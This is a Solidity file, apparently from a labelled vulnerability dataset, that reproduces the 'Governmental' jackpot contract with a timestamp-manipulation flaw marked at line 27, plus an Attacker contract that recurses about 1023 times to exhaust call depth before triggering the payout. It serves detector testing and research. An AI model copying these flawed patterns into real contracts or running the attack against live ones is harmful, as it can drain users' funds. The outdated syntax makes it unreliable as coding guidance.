/*
 * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental
 * @author: -
 * @vulnerable_at_lines: 27
 */

//added pragma version
pragma solidity ^0.4.26;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    require (msg.value>=1 ether);
  }

  function invest() {
    require (msg.value>=jackpot/2);
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
    // <yes> <report> TIME_MANIPULATION
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    require (block.timestamp >= lastInvestmentTimestamp+ONE_MINUTE);
  

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if (0<=count && count<1023) 
    {
      uint p = count+1;
      this.attack.gas(msg.gas-2000)(target, p);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
